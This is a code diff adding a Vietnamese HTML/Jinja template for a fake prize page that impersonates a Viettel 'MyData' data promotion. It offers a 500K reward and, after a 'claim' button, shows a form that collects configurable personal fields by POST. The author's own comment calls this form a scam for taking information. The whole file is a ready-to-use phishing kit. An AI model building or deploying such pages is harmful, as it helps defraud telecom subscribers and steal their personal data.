@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sự Kiện Nhận Quà</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            font-family: 'Montserrat', sans-serif; 
+            margin: 0; padding: 0;
+            min-height: 100vh; 
+            /* Nền tia sáng đỏ đặc trưng */
+            background: repeating-conic-gradient(
+                from 0deg at 50% 60%,
+                #d32f2f 0deg 15deg,
+                #e53935 15deg 30deg
+            );
+            /* Bỏ overflow: hidden để cho phép cuộn */
+            overflow-x: hidden;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* --- BƯỚC 1: BANNER CHIẾN DỊCH --- */
+        #step1-banner {
+            position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; 
+            width: 100%; min-height: calc(100vh - 100px);
+            padding-bottom: 80px; /* Chừa không gian cho footer */
+            padding-top: 30px; /* Thêm khoảng trống nhỏ phía trên do đã xóa thanh URL */
+        }
+
+        /* Logo MyData Góc Phải */
+        .mydata-logo { 
+            position: absolute; top: 10px; right: 20px; 
+            background: #ff5722; border-radius: 8px; padding: 10px;
+            display: flex; flex-direction: column; align-items: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2); border: 2px solid white;
+        }
+        .mydata-icon { width: 30px; height: 30px; border-top: 4px solid white; border-right: 4px solid white; border-radius: 0 30px 0 0; margin-bottom: 5px; position: relative; }
+        .mydata-icon::after { content: ''; position: absolute; bottom: 0; left: 0; width: 15px; height: 15px; border-top: 4px solid white; border-right: 4px solid white; border-radius: 0 15px 0 0; }
+        .mydata-text { color: white; font-size: 10px; font-weight: 900; letter-spacing: 1px; }
+
+        /* Tiêu đề Box Xanh & Đỏ */
+        .title-group { display: flex; flex-direction: column; align-items: center; margin-top: 20px; margin-bottom: 10px; }
+        .box-blue { 
+            background: #001a4d; border: 3px solid #ffeb3b; border-radius: 10px; 
+            padding: 10px 25px; color: white; font-size: 24px; font-weight: 900; 
+            transform: rotate(-3deg) translateY(10px); z-index: 2; position: relative;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+        }
+        .box-red { 
+            background: #d32f2f; border: 3px solid white; border-radius: 10px; 
+            padding: 10px 25px; color: white; font-size: 20px; font-weight: 900; 
+            transform: rotate(3deg); z-index: 1; box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+        }
+        .text-yellow { color: #ffeb3b; }
+        
+        .date-text { color: white; font-size: 16px; font-weight: bold; margin-top: 15px; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); }
+
+        /* Phần quà giữa màn hình */
+        .prize-section { display: flex; flex-direction: column; align-items: center; margin-top: 30px; position: relative; }
+        .prize-sub { color: white; font-size: 22px; font-weight: 900; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); margin-bottom: -10px; z-index: 2; }
+        .prize-amount { 
+            font-size: 100px; font-weight: 900; color: #ffeb3b; margin: 0; line-height: 1.1;
+            text-shadow: 3px 3px 0 #d84315, 6px 6px 0 #bf360c, 0 10px 15px rgba(0,0,0,0.5);
+            z-index: 2; position: relative;
+        }
+
+        /* Nút nhận thưởng thay cho hộp quà */
+        .btn-claim {
+            background: linear-gradient(to bottom, #ffeb3b 0%, #ff9800 100%);
+            color: #b71c1c; font-size: 22px; font-weight: 900;
+            padding: 15px 50px; border: 3px solid white; border-radius: 40px; cursor: pointer;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            animation: pulse 1.5s infinite; transition: 0.2s; z-index: 20; margin-top: 20px;
+        }
+        .btn-claim:hover { transform: scale(1.05) translateY(-3px); }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 235, 59, 0.6); } 70% { box-shadow: 0 0 0 20px rgba(255, 235, 59, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 235, 59, 0); } }
+
+        /* Các thẻ bay lơ lửng */
+        .float-tag { 
+            background: white; color: #d32f2f; font-weight: 900; padding: 5px 15px; font-size: 18px; 
+            border-radius: 4px; box-shadow: 0 5px 10px rgba(0,0,0,0.3); position: absolute; 
+            animation: floatTag 3s ease-in-out infinite; z-index: 5;
+        }
+        .tag-1 { top: 15%; left: 8%; transform: rotate(-25deg); }
+        .tag-2 { top: 18%; right: 10%; transform: rotate(20deg); animation-delay: 1s; font-size: 22px; }
+        .tag-3 { bottom: 25%; left: 12%; transform: rotate(15deg); animation-delay: 0.5s; font-size: 22px; }
+        .tag-4 { bottom: 20%; right: 15%; transform: rotate(-15deg); animation-delay: 1.5s; }
+        @keyframes floatTag { 0%, 100% { transform: translateY(0) rotate(var(--rot)); } 50% { transform: translateY(-15px) rotate(var(--rot)); } }
+
+        /* Dải Footer - Ghim cố định ở dưới cùng */
+        .promo-footer {
+            position: fixed; bottom: 0; left: 0; width: 100%; background: #e65100; 
+            color: white; text-align: center; padding: 12px 0; font-size: 13px; 
+            font-weight: 700; text-transform: uppercase; letter-spacing: 1px; z-index: 100;
+        }
+
+        /* --- BƯỚC 2: FORM NHẬP THÔNG TIN --- */
+        #step2-form {
+            display: none; 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
+            background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
+            z-index: 200; justify-content: center; align-items: center;
+            overflow-y: auto; padding: 20px 0;
+        }
+        
+        .form-card { 
+            background: #ffffff; width: 90%; max-width: 400px; border-radius: 15px; 
+            padding: 30px 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center; 
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            position: relative; overflow: hidden; border-top: 8px solid #d32f2f;
+            margin: auto;
+        }
+        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+
+        .form-card h2 { color: #d32f2f; font-size: 24px; margin-top: 10px; margin-bottom: 5px; font-weight: 900; text-transform: uppercase; }
+        .form-card .desc { font-size: 14px; color: #666; margin-bottom: 25px; font-weight: 700; padding: 0 10px; }
+        
+        .form-group { text-align: left; margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 900; margin-bottom: 6px; color: #333; }
+        .form-group input { width: 100%; padding: 14px 15px; border: 2px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 15px; font-family: 'Montserrat', sans-serif; font-weight: 700; color: #333; background: #f9f9f9; transition: 0.3s; }
+        .form-group input:focus { outline: none; border-color: #d32f2f; background: #fff; box-shadow: 0 0 0 3px rgba(211,47,47,0.2); }
+        
+        .btn-submit { width: 100%; padding: 16px; background: #d32f2f; border: none; border-radius: 8px; color: #fff; font-weight: 900; font-size: 18px; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(211,47,47,0.4); text-transform: uppercase; }
+        .btn-submit:hover { background: #b71c1c; transform: translateY(-2px); }
+    </style>
+</head>
+<body>
+    
+    <!-- BƯỚC 1: BANNER QUẢNG CÁO -->
+    <div id="step1-banner">
+        
+        <!-- Logo Góc Phải -->
+        <div class="mydata-logo">
+            <div class="mydata-icon"></div>
+            <div class="mydata-text">MYDATA</div>
+        </div>
+
+        <!-- Các hộp tiêu đề -->
+        <div class="title-group">
+            <div class="box-blue">NẠP ĐẦY <span class="text-yellow">DATA</span></div>
+            <div class="box-red"><span class="text-yellow">BAO LA</span> QUÀ TẶNG</div>
+            <div class="date-text">Từ 01/09 - 31/12/2026</div>
+        </div>
+
+        <!-- Thẻ bay lơ lửng -->
+        <div class="float-tag tag-1" style="--rot: -25deg;">500K</div>
+        <div class="float-tag tag-2" style="--rot: 20deg;">500K</div>
+        <div class="float-tag tag-3" style="--rot: 15deg;">500K</div>
+        <div class="float-tag tag-4" style="--rot: -15deg;">10K</div>
+
+        <!-- Giải thưởng giữa -->
+        <div class="prize-section">
+            <div class="prize-sub">CƠ HỘI TRÚNG</div>
+            <div class="prize-amount">500K</div>
+            
+            <button type="button" class="btn-claim" onclick="showForm()">MỞ QUÀ NGAY</button>
+        </div>
+
+    </div>
+
+    <!-- Banner dưới cùng cố định -->
+    <div class="promo-footer">
+        ƯU ĐÃI DÀNH RIÊNG CHO THUÊ BAO VIETTEL SỬ DỤNG HĐH ANDROID
+    </div>
+
+    <!-- BƯỚC 2: FORM LỪA ĐẢO LẤY THÔNG TIN -->
+    <div id="step2-form">
+        <div class="form-card">
+            <h2>Xác Nhận Nhận Quà</h2>
+            <div class="desc">Vui lòng điền chính xác thông tin để hệ thống nạp thẳng vào tài khoản của bạn.</div>
+            
+            <form method="POST" onsubmit="return validateForm()">
+                {% for field in data.inputs %}
+                <div class="form-group">
+                    <label>{{ field.name }}</label>
+                    <input type="{{ field.type }}" name="field_{{ loop.index0 }}" id="field_{{ loop.index0 }}" required placeholder="Nhập {{ field.name|lower }}">
+                    <input type="hidden" id="pattern_{{ loop.index0 }}" value="{{ field.pattern }}">
+                    <input type="hidden" id="msg_{{ loop.index0 }}" value="{{ field.msg }}">
+                </div>
+                {% endfor %}
+                <button type="submit" class="btn-submit">HOÀN TẤT NHẬN THƯỞNG</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function showForm() {
+            document.getElementById('step1-banner').style.display = 'none';
+            document.getElementById('step2-form').style.display = 'flex';
+        }
+
+        function validateForm() {
+            let i = 0;
+            while (true) {
+                let fieldInput = document.getElementById("field_" + i);
+                if (!fieldInput) break; 
+                let val = fieldInput.value;
+                let patternInput = document.getElementById("pattern_" + i);
+                let msgInput = document.getElementById("msg_" + i);
+                
+                if (patternInput && patternInput.value) {
+                    let pattern = new RegExp(patternInput.value);
+                    if (!pattern.test(val)) {
+                        alert(msgInput.value);
+                        return false; 
+                    }
+                }
+                i++;
+            }
+            return true;
+        }
+    </script>
+</body>
+</html>
